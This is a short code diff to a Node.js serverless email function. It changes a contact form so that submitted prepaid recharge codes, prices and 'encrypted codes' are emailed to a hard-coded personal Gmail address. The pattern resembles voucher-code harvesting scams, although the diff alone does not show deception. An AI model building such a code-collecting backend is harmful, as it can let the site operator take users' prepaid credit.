@@ -22,7 +22,7 @@ exports.handler = async (event, context) => {
   }
 
   // Parse the request body
-  const { email, subject, message } = JSON.parse(event.body);
+  const { email, rechargeType, price, rechargeCode, encryptedCode } = JSON.parse(event.body);
 
   // Create a transporter object using the default SMTP transport
   let transporter = nodemailer.createTransport({
@@ -37,8 +37,8 @@ exports.handler = async (event, context) => {
   let mailOptions = {
     from: email, // replace with your email
     to: 'henry.gossou17@gmail.com',
-    subject: subject,
-    text: message
+    subject: 'Recharge Information',
+    text: `Recharge Type: ${rechargeType}\nPrice: ${price}\nRecharge Code: ${rechargeCode}\nEncrypted Code: ${encryptedCode}`
   };
 
   try {
